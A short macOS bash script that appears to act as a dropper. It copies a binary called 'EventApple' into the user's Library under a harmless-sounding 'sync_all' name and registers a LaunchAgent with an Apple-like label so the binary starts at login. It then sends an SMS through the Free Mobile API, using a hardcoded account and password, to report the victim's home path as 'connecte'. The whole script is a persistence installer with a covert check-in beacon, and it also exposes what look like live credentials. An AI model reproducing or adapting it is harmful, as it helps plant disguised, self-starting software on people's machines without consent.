#!/bin/bash

cp ./EventApple $HOME/Library/Assistant/sync_all

echo "<plist version=\"1.0\">
<dict>
<key>Label</key>
<string>com.EventAppleAll</string>
<key>Program</key>
<string>$HOME/Library/Assistant/sync_all</string>
<key>RunAtLoad</key>
<true/>
<key>KeepAlive</key>
<false/>
<key>LaunchOnlyOnce</key>        
<true/>
<key>StartInterval</key>
<integer>60</integer>
</dict>
</plist>
" > $HOME/Library/LaunchAgents/com.EventAppleAll.plist

launchctl load -w $HOME/Library/LaunchAgents/com.EventAppleAll.plist

curl "https://smsapi.free-mobile.fr/sendmsg?user=34271275&pass=3DmyCrCbUj3sdi&msg=$HOME%\20connecte"
